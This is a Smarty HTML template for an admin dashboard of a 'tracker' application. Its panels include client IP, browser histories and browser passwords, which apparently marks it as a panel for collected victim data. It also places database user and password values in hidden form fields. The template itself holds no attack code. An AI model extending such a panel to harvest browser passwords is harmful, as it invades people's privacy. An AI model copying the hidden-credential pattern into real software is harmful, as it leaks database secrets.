<div class="row col-lg-12 col-md-12" style="margin-top: 10px;">
    {if isset($dbInfo)}
        {*{$dbInfo|print_r}*}
        <input type="hidden" id="dbInfoServer" value="{$dbInfo.name}">
        <input type="hidden" id="dbInfoDb" value="{$dbInfo.db}">
        <input type="hidden" id="dbInfoUser" value="{$dbInfo.user}">
        <input type="hidden" id="dbInfoPassword" value="{$dbInfo.password}">
    {/if}

    <table class="table">
        <tr>
            <td>
                <a href="javascript:void(0);" onclick="window.location = _root_ + 'system'"
                   class="button button-danger float-left">
                    <i class="fa fa-arrow-left" aria-hidden="true"></i> Back
                </a>
            </td>
        </tr>
    </table>

    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">App Status</legend>
            <div class="row" id="tracker-app-status-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a id="seeMore" href="javascript:void(0);" class="button button-success float-right" data-type="apps_status">
                <i class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">App Licence</legend>
            <div class="row" id="tracker-app-licence-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a id="seeMore" href="javascript:void(0);" class="button button-success float-right" data-type="app_licences">
                <i class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">App Payment</legend>
            <div class="row" id="tracker-app-payment-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">Client Browser Info</legend>
            <div class="row" id="tracker-client-browser-info-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">Client IP Info</legend>
            <div class="row" id="tracker-client-ip-info-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">Client Update Info</legend>
            <div class="row" id="tracker-client-update-info-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">Browser Histories Info</legend>
            <div class="row" id="tracker-browser-histories-info-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">Browser Passwords Info</legend>
            <div class="row" id="tracker-browser-passwords-info-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light">Notifications</legend>
            <div class="row" id="system-notification-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/log/" class="button button-success float-right">
                <i class="fa fa-list"></i> See more
            </a>
        </fieldset>
    </div>
    <div class="row col-lg-4 col-md-4 col-sm-6 col-xs-12">
        <fieldset class="box-shadow box-shadow-light">
            <legend class="box-shadow box-shadow-light"> Messages</legend>
            <div class="row" id="system-contact-message-viewer">
                <div class="box-message box-notify box-shadow box-shadow-light">
                    <span class="box-notify-symbol"><i class="fa fa-info"></i></span>&nbsp;
                    <span class="notify-md-content"> Loading...</span>
                </div>
            </div>
            <a href="{$layoutParams.root}system/contactmessage/" class="button button-success float-right"><i
                        class="fa fa-list"></i> See more</a>
        </fieldset>
    </div>
</div>